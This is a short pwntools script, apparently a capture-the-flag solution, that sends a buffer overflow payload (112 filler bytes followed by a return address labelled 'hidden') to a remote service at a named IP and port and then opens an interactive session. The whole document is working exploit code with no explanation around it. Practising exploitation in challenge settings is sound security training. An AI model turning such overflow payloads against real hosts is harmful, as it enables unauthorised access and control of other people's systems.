from pwn import *

p = process("./ch1")
r = remote("143.198.55.88", 1997)

hidden = p64(0x08048505)

pay = b"A" * 112
pay += hidden

r.sendline(pay)
r.interactive()
